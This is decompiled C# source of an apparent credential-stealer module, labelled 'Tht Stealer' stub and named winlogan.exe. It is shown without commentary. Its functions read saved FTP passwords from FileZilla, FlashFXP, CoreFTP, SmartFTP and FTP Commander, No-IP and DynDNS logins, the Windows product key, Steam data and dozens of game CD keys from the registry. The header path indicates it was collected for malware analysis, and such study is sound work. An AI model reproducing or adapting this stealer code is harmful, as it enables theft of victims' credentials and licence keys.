// Decompiled with JetBrains decompiler
// Type: Ftp
// Assembly: winlogan.exe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 318DE2DF-1405-4E2E-8CC4-399298931BFA
// Assembly location: C:\Users\ZetSving\Desktop\На разбор Стиллеров\Tht Stealer\Tht Stealer\stub.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

[StandardModule]
internal sealed class Ftp
{
  private static string FileZilla = (string) null;
  private static string NoIP = (string) null;
  private static string Windows = (string) null;
  private static string Seriallist = (string) null;
  private static string ff = (string) null;
  private static string steam = (string) null;
  private static string dyndns = (string) null;
  private static string fComand = (string) null;
  private static string fflash = (string) null;
  private static string fcore = (string) null;
  private static string fsmart = (string) null;

  public static string Cut(string sInhalt, string sText, string sText2)
  {
    // ISSUE: unable to decompile the method.
  }

  public static string SFilezilla()
  {
    string sInhalt = Ftp.ReadFile(Interaction.Environ("APPDATA") + "\\FileZilla\\sitemanager.xml");
    string str1 = Ftp.Cut(sInhalt, "<Host>", "</Host>");
    string str2 = Ftp.Cut(sInhalt, "<Port>", "</Port>");
    string Left = Ftp.Cut(sInhalt, "<User>", "</User>");
    string str3 = Ftp.Cut(sInhalt, "<Pass>", "</Pass>");
    string str4 = Ftp.Cut(sInhalt, "<Name>", "</Name>");
    string str5;
    if (Operators.CompareString(Left, "", false) != 0)
    {
      try
      {
        str5 = "Adı: " + str4 + "\r\nHost: " + str1 + ":" + str2 + "\r\nUsername: " + Left + "\r\nPassword: " + str3 + "<br />";
        goto label_4;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
label_4:
    return str5;
  }

  public static string SCommander()
  {
    string sInhalt = Ftp.ReadLine(Strings.Replace(Ftp.RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\FTP Commander\\UninstallString"), "uninstall.exe", (string) null, 1, -1, CompareMethod.Binary) + "Ftplist.txt", -1);
    string str1 = Ftp.Cut(sInhalt, ";Server=", ";Port=");
    string str2 = Ftp.Cut(sInhalt, ";Port=", ";Password=");
    string Left = Ftp.Cut(sInhalt, ";User=", ";Anonymous=");
    string str3 = Ftp.Cut(sInhalt, ";Password=", ";User=");
    string str4 = Ftp.Cut(sInhalt, "Name=", ";Server=");
    string str5;
    if (Operators.CompareString(Left, "", false) != 0)
    {
      try
      {
        str5 = "Entry: " + str4 + "\r\nHost: " + str1 + ":" + str2 + "\r\nUsername: " + Left + "\r\nPassword: " + str3 + "<br />";
        goto label_4;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
label_4:
    return str5;
  }

  public static string SFlashFxp()
  {
    string sInhalt = Ftp.ReadFile(Strings.Replace(Interaction.Environ("APPDATA"), Interaction.Environ("Username"), "All Users", 1, -1, CompareMethod.Binary) + "\\FlashFXP\\3\\quick.dat");
    string str1 = Ftp.Cut(sInhalt, "IP=", "\r\n");
    string str2 = Ftp.Cut(sInhalt, "port=", "\r\n");
    string Left = Ftp.Cut(sInhalt, "user=", "\r\n");
    string str3 = Ftp.Cut(sInhalt, "pass=", "\r\n");
    string str4 = Ftp.Cut(sInhalt, "created=", "\r\n");
    string str5;
    if (Operators.CompareString(Left, "", false) != 0)
    {
      try
      {
        str5 = "Entry: " + str4 + "\r\nHost: " + str1 + ":" + str2 + "\r\nUsername: " + Left + "\r\nPassword: " + str3 + " (Encrypt)<br />";
        goto label_4;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
label_4:
    return str5;
  }

  public static string ScoreFTP()
  {
    string str1 = Ftp.ReadFile(Interaction.Environ("APPDATA") + "\\CoreFTP\\sites.idx");
    string str2 = Ftp.RegRead("HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + str1 + "\\Host");
    string str3 = Ftp.RegRead("HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + str1 + "\\Port");
    string Left = Ftp.RegRead("HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + str1 + "\\User");
    string str4 = Ftp.RegRead("HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + str1 + "\\PW");
    string str5 = Ftp.RegRead("HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + str1 + "\\Name");
    string str6;
    if (Operators.CompareString(Left, "", false) != 0)
    {
      try
      {
        str6 = "Entry: " + str5 + "\r\nHost: " + str2 + ":" + str3 + "\r\nUsername: " + Left + "\r\nPassword: " + str4 + " (Encrypt)<br />";
        goto label_4;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
label_4:
    return str6;
  }

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public static string Ssmart()
  {
    string sInhalt = Ftp.ReadFile(Interaction.Environ("APPDATA") + "\\SmartFTP\\Client 2.0\\Favorites\\Quick Connect\\" + FileSystem.Dir(Interaction.Environ("APPDATA") + "\\SmartFTP\\Client 2.0\\Favorites\\Quick Connect\\*.xml", FileAttribute.Normal));
    string str1 = Ftp.Cut(sInhalt, "<Host>", "</Host>");
    string str2 = Ftp.Cut(sInhalt, "<Port>", "</Port>");
    string Left = Ftp.Cut(sInhalt, "<User>", "</User>");
    string str3 = Ftp.Cut(sInhalt, "<Password>", "</Password>");
    string str4 = Ftp.Cut(sInhalt, "<Name>", "</Name>");
    string str5;
    if (Operators.CompareString(Left, "", false) != 0)
    {
      try
      {
        str5 = "Entry: " + str4 + "\r\nHost: " + str1 + ":" + str2 + "\r\nUsername: " + Left + "\r\nPassword: " + str3 + " (Encrypt)<br />";
        goto label_4;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
label_4:
    return str5;
  }

  public static string SWindowskey()
  {
    string returnProductKey;
    try
    {
      returnProductKey = Ftp.GetCDKeyFromWindows.ReturnProductKey;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return returnProductKey;
  }

  public static string SNoip()
  {
    string Password = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\", "Password", (object) null));
    string str1 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\", "Checked", (object) null));
    string Left = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\", "Username", (object) null));
    string str2 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\", "ProxyUsername", (object) null));
    string str3 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\", "ProxyPassword", (object) null));
    string str4 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\", "Hosts", (object) null));
    string str5;
    if (Operators.CompareString(Left, "", false) != 0)
    {
      try
      {
        str5 = "Aktivierte Hosts: " + str1 + "\r\nAlle Hosts: " + str4 + "\r\nUsername: " + Left + "\r\nPassword: " + Ftp.FromBase64(Password) + "\r\nProxy Username: " + str3 + "\r\nProxy Password: " + str2 + "<br />";
        goto label_4;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
label_4:
    return str5;
  }

  public static string sDynDns()
  {
    string sInhalt = Ftp.ReadFile(Strings.Replace(Interaction.Environ("APPDATA"), Interaction.Environ("Username"), "All Users", 1, -1, CompareMethod.Binary) + "\\DynDNS\\Updater\\config.dyndns");
    string str1 = Ftp.Cut(sInhalt, "[Hosts]", "Count=");
    string str2 = Ftp.Cut(sInhalt, "Username=", "\r\n");
    string Left = Ftp.Cut(sInhalt, "Password=", "\r\n");
    string str3;
    if (Operators.CompareString(Left, "", false) != 0)
    {
      try
      {
        str3 = "Hosts:" + str1 + "\r\nUsername: " + str2 + "\r\nPassword: " + Left + " (Encrypt)<br />";
        goto label_4;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
label_4:
    return str3;
  }

  public static string ReadReg(string hKey)
  {
    // ISSUE: unable to decompile the method.
  }

  public static void sactofwar()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Eugen Systems\\ActOfWar\\RegNumber";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.actofwart.Text = "Act of War: " + Ftp.ReadReg(hKey);
  }

  public static void sanno()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Sunflowers\\Anno 1701\\SerialNo";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.anno1701t.Text = "Anno 1701: " + Ftp.ReadReg(hKey);
  }

  public static void sbattle()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.battlefield1942t.Text = "Battlefield 1942: " + Ftp.ReadReg(hKey);
  }

  public static void sbattle2()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Electronic Arts\\EA Games\\Battlefield 2\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.battlefield2t.Text = "Battlefield 2: " + Ftp.ReadReg(hKey);
  }

  public static void sbattle2142()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 2142\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.battlefield2142t.Text = "Battlefield 2142: " + Ftp.ReadReg(hKey);
  }

  public static void sbattlevi()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Electronic Arts\\EA GAMES\\Battlefield Vietnam\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.battlefieldvietnamt.Text = "Battlefield Vietnam: " + Ftp.ReadReg(hKey);
  }

  public static void sblackvew()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Electronic Arts\\EA GAMES\\Black and White\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.blackandwhitet.Text = "Black and White: " + Ftp.ReadReg(hKey);
  }

  public static void sblackvew2()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Electronic Arts\\EA GAMES\\Black and White 2\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.blackandwhitet2t.Text = "Black and White 2: " + Ftp.ReadReg(hKey);
  }

  public static void scod()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Activision\\Call of Duty\\codkey";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.callofdutyt.Text = "Call of Duty: " + Ftp.ReadReg(hKey);
  }

  public static void scod2()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Activision\\Call of Duty 2\\codkey";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.callofduty2t.Text = "Call of Duty 2: " + Ftp.ReadReg(hKey);
  }

  public static void scod4()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Activision\\Call of Duty 4\\codkey";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.callofduty4t.Text = "Call of Duty 4: " + Ftp.ReadReg(hKey);
  }

  public static void scod5()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Activision\\Call of Duty WAW,codkey";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.callofduty5t.Text = "Call of Duty 5: " + Ftp.ReadReg(hKey);
  }

  public static void scacg()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\Electronic Arts\\EA Games\\Generals\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.cacgeneralst.Text = "Command and Conquer: Generals: " + Ftp.ReadReg(hKey);
  }

  public static void scacgzh()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\electronic arts\\ea games\\command and conquer generals zero hour\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.cacgeneralzerohourt.Text = "Command and Conquer: Generals Zero Hour: " + Ftp.ReadReg(hKey);
  }

  public static void scacts()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\westwood\\tiberian sun\\serial";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.cactst.Text = "Command and Conquer: Tiberian Sun: " + Ftp.ReadReg(hKey);
  }

  public static void scacra()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\westwood\\red alert\\serial";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.cacrat.Text = "Command and Conquer: Red Alert: " + Ftp.ReadReg(hKey);
  }

  public static void scacra2()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\Westwood\\Red Alert 2\\Serial";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.cacra2t.Text = "Command and Conquer: Red Alert 2: " + Ftp.ReadReg(hKey);
  }

  public static void scacra2y()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\Westwood\\Yuri's Revenge\\Serial";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.cacra2yt.Text = "Command and Conquer: Red Alert 2 Yuri's Revenge: " + Ftp.ReadReg(hKey);
  }

  public static void scac3tw()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Command and Conquer 3\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.cac3twt.Text = "Command and Conquer 3: Tiberium Wars: " + Ftp.ReadReg(hKey);
  }

  public static void scompanyof()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\THQ\\Company of Heroes\\CoHProductKey";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.companyofheroest.Text = "Company of Heroes: " + Ftp.ReadReg(hKey);
  }

  public static void scrysis()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Electronic Arts\\Electronic Arts\\Crysis\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.crysist.Text = "Crysis: " + Ftp.ReadReg(hKey);
  }

  public static void stechland()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\Techland\\Chrome,SerialNumber";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.techlandt.Text = "Techland: " + Ftp.ReadReg(hKey);
  }

  public static void sfarcry()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\CRYTEK\\FARCRY\\UBI.COM\\CDKey";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.farcryt.Text = "Far Cry: " + Ftp.ReadReg(hKey);
  }

  public static void sfarcry2()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\CRYTEK\\FARCRY2\\UBI.COM\\CDKey";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.farcry2t.Text = "Far Cry 2: " + Ftp.ReadReg(hKey);
  }

  public static void sfear()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\Sierra\\CDKey";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.feart.Text = "F.E.A.R: " + Ftp.ReadReg(hKey);
  }

  public static void sfifa()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\Electronic Arts\\Electronic Arts\\FIFA 08\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.fifat.Text = "Fifa 08: " + Ftp.ReadReg(hKey);
  }

  public static void sfrontlines()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\THQ\\Frontlines: Fuel of War\\ProductKey";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.frontlinest.Text = "Frontlines: Fuel of War: " + Ftp.ReadReg(hKey);
  }

  public static void shellgate()
  {
    string hKey = "SOFTWARE\\Electronic Arts\\EA Games\\Hellgate: London\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.hellgatet.Text = "Hellgate: London: " + Ftp.ReadReg(hKey);
  }

  public static void smoha()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\Electronic Arts\\Medal of Honor Airborne\\Product GUID";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.mohat.Text = "Medal of Honor: Airborne: " + Ftp.ReadReg(hKey);
  }

  public static void smohaa()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault\\egrc";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.mohaat.Text = "Medal of Honor: Allied Assault: " + Ftp.ReadReg(hKey);
  }

  public static void smohaab()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.mohaabt.Text = "Medal of Honor: Allied Assault: Breakth: " + Ftp.ReadReg(hKey);
  }

  public static void smohaas()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Spearhead\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.mohaast.Text = "Medal of Honor: Allied Assault: Spearhe: " + Ftp.ReadReg(hKey);
  }

  public static void snba()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Electronic Arts\\EA Sports\\NBA Live 08\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.nbat.Text = "NBA 08: " + Ftp.ReadReg(hKey);
  }

  public static void snfsu()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Electronic Arts\\EA GAMES\\Need For Speed Underground\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.nfsut.Text = "Need For Speed Underground: " + Ftp.ReadReg(hKey);
  }

  public static void snfsu2()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\Electronic Arts\\EA Games\\Need for Speed Underground 2\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.nfsut2.Text = "Need For Speed Underground 2: " + Ftp.ReadReg(hKey);
  }

  public static void snfsc()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Need for Speed Carbon\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.nfsct.Text = "Need For Speed Carbon: " + Ftp.ReadReg(hKey);
  }

  public static void snfsmw()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need for Speed Most Wanted\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.nfsmwt.Text = "Need For Speed Most Wanted: " + Ftp.ReadReg(hKey);
  }

  public static void snfsps()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Need for Speed ProStreet\\ergc\\";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.nfspst.Text = "Need For Speed Pro Street: " + Ftp.ReadReg(hKey);
  }

  public static void squake()
  {
    string hKey = "HKEY_CURRENT_USER\\SOFTWARE\\id\\Quake 4\\CDKey";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.quaket.Text = "Quake 4: " + Ftp.ReadReg(hKey);
  }

  public static void sstalker()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\GSC Game World\\STALKER-SHOC\\InstallCDKEY";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.stalkert.Text = "S.T.A.L.K.E.R. - Shadow of Chernobyl: " + Ftp.ReadReg(hKey);
  }

  public static void sswat()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Sierra\\CDKey\\swat4";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.swatt.Text = "S.W.A.T 4: " + Ftp.ReadReg(hKey);
  }

  public static void sunreal()
  {
    string hKey = "HKEY_CURRENT_USER\\Software\\Unreal Technology\\Installed Apps\\UT2004\\CDKey";
    if (Operators.CompareString(Ftp.ReadReg(hKey), "", false) == 0)
      return;
    MyProject.Forms.Form1.unrealt.Text = "Unreal Tournament 2004: " + Ftp.ReadReg(hKey);
  }

  public static string svalve()
  {
    string str1;
    try
    {
      string str2 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Valve\\Steam", "SteamPath", (object) null)) + "\\SteamApps";
      str2.Replace("/", "\\");
      string str3 = str2.Replace("\\SteamApps", "");
      string str4 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Valve\\Half-Life\\Settings", "io", (object) null));
      string str5 = new StreamReader(str3 + "\\ClientRegistry.blob").ReadToEnd().ToString();
      int index = checked (str5.IndexOf("Phrase", 1) + 40);
      int num1 = checked (index + 92);
      string str6 = (string) null;
      int num2 = index;
      int num3 = num1;
      int num4 = num2;
      while (num4 <= num3)
      {
        str6 = str6 + Conversions.ToString(str5[index]);
        checked { ++index; }
        checked { ++num4; }
      }
      Ftp.steam = str4 + Environment.NewLine + str6;
      str1 = Ftp.steam;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  public static string ReadFile(string sFile)
  {
    // ISSUE: unable to decompile the method.
  }

  public static string RegRead(string hKey)
  {
    // ISSUE: unable to decompile the method.
  }

  public static string ReadLine(string filename, int line)
  {
    string str;
    try
    {
      string[] strArray = MyProject.Computer.FileSystem.ReadAllText(filename, Encoding.Default).Split('\r');
      str = line <= 0 ? (line >= 0 ? "" : strArray[checked (strArray.Length + line - 1)]) : strArray[checked (line - 1)];
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = "";
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static string FromBase64(string Password)
  {
    return Encoding.Default.GetString(Convert.FromBase64String(Password));
  }

  public class GetCDKeyFromWindows
  {
    public static string ReturnProductKey
    {
      get
      {
        return Ftp.GetCDKeyFromWindows.GetCDKey();
      }
    }

    [DebuggerNonUserCode]
    public GetCDKeyFromWindows()
    {
    }

    private static string GetCDKey()
    {
      byte[] numArray1;
      byte[] numArray2 = (byte[]) Utils.CopyArray((Array) numArray1, (Array) new byte[15]);
      string name1 = "DigitalProductId";
      string name2 = "Software\\Microsoft\\Windows NT\\CurrentVersion";
      try
      {
        object objectValue = RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.LocalMachine.OpenSubKey(name2, false).GetValue(name1, (object) null));
        if (objectValue.GetType() == typeof (byte[]))
        {
          byte[] numArray3 = (byte[]) objectValue;
          int index = 52;
          do
          {
            numArray2[checked (index - 52)] = numArray3[index];
            checked { ++index; }
          }
          while (index <= 66);
        }
        byte[] numArray4 = new byte[24]
        {
          (byte) 66,
          (byte) 67,
          (byte) 68,
          (byte) 70,
          (byte) 71,
          (byte) 72,
          (byte) 74,
          (byte) 75,
          (byte) 77,
          (byte) 80,
          (byte) 81,
          (byte) 82,
          (byte) 84,
          (byte) 86,
          (byte) 87,
          (byte) 88,
          (byte) 89,
          (byte) 50,
          (byte) 51,
          (byte) 52,
          (byte) 54,
          (byte) 55,
          (byte) 56,
          (byte) 57
        };
        string str = "";
        int length = numArray4.Length;
        while (length >= 0)
        {
          int index1 = 0;
          int index2 = checked (numArray2.Length - 1);
          while (index2 >= 0)
          {
            int num = checked (index1 * 256) ^ (int) numArray2[index2];
            numArray2[index2] = checked ((byte) Math.Round(Conversion.Int(unchecked ((double) num / 24.0))));
            index1 = num % 24;
            checked { index2 += -1; }
          }
          str = Conversions.ToString(Strings.Chr((int) numArray4[index1])) + str;
          if (length % 5 == 0 & length != 0)
            str = "-" + str;
          checked { length += -1; }
        }
        return str;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return "";
    }
  }
}
